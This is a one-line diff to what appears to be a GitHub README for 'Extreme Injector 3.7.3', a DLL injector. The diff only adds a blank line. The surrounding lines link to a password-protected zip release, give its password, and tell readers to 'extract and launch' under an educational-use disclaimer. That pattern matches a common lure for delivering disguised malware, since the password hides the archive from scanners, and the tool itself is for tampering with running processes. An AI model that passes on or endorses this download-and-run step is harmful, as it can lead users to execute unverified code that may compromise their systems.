@@ -24,6 +24,7 @@ This repository is provided strictly for educational and research purposes. File
 Password-protected archive for convenience – extract and launch.
 
 📥 [Download `Extreme-Injector-3.7.3.zip`](https://github.com/noraiz007/Extreme-Injector-3.7.3-Dll-Injector-Desktop/releases/download/DLLInjector/Extreme-v3.7.3.zip)
+
 🔐 `LS2026`
 
 Archive contents:
